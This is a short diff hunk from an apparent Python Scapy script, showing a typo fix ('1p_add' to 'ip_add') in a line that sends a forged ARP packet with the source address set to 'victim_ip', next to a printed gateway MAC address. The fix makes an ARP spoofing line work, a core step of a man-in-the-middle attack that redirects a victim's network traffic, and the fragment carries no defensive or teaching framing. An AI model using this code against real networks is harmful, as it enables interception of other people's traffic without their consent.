@@ -49,4 +49,4 @@ print "MAC_gateway    : "+MAC_gateway
 
 
 
-send(ARP(op=ARP.who_has, pdst=1p_add, psrc=victim_ip, hwdst=mac_add))
+send(ARP(op=ARP.who_has, pdst=ip_add, psrc=victim_ip, hwdst=mac_add))
